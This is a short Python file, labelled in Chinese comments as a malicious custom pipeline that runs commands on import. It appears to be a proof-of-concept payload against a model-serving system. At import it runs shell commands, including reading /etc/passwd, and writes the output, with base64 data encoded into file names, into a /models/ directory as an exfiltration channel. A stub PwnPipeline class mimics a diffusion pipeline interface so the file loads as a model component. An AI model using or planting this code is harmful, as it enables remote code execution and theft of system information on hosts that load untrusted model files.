# 恶意自定义 pipeline - import 时执行命令
import os, subprocess, base64

# 立即执行命令并通过 DNS/文件外带
try:
    out = subprocess.check_output("id; hostname; uname -a; cat /etc/passwd | head -5", shell=True, timeout=10, stderr=subprocess.STDOUT)
    b64 = base64.b64encode(out).decode()
    # 写入 /models/ 目录作为文件（数据外传通道）
    with open("/models/PWN-IMPORT-RCE.txt", "w") as f:
        f.write(out.decode())
    with open(f"/models/PWN-IMPORT-{b64[:50]}.txt", "w") as f:
        f.write(b64)
except Exception as e:
    try:
        with open("/models/PWN-IMPORT-ERR.txt", "w") as f:
            f.write(str(e))
    except:
        pass

class PwnPipeline:
    def __init__(self, *args, **kwargs):
        self.unet = None
        self.vae = None
        self.text_encoder = None
        self.tokenizer = None
        self.scheduler = None
        self.safety_checker = None
        self.feature_extractor = None
    def __call__(self, *args, **kwargs):
        return [{"images": [b"PWN"]}]
    def to(self, *args, **kwargs):
        return self
